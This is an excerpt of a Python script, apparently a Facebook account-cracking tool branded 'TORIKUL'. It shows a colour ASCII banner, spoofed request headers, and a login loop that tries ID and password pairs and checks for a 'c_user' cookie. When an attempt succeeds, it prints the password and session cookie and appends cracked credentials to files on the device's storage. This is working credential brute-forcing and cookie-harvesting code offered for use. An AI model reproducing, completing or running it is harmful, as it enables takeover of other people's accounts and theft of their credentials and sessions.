...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=100046155324090')
logo =("""\033[0;92m
  /$$$$$$$$                  /$$ /$$                 /$$      
|__  $$__/                 |__/| $$                | $$      
   | $$  /$$$$$$   /$$$$$$  /$$| $$   /$$ /$$   /$$| $$      
   ...
   | $$| $$  | $$| $$      | $$| $$_  $$ | $$  | $$| $$      
   | $$|  $$$$$$/| $$      | $$| $$ \  $$|  $$$$$$/| $$      
   |__/ \______/ |__/      |__/|__/  \__/ \______/ |__/
...
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mDeveloper \033[1;31m● \x1b[38;5;46mTORIKUL
\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46mFacebook  \033[1;31m● \x1b[38;5;46mmafiya king
...
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    ...
    'user-agent': 'pro'}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[TORIKUL-OK💥] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/TORIKUL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/TORIKUL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr} TORIKUL {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
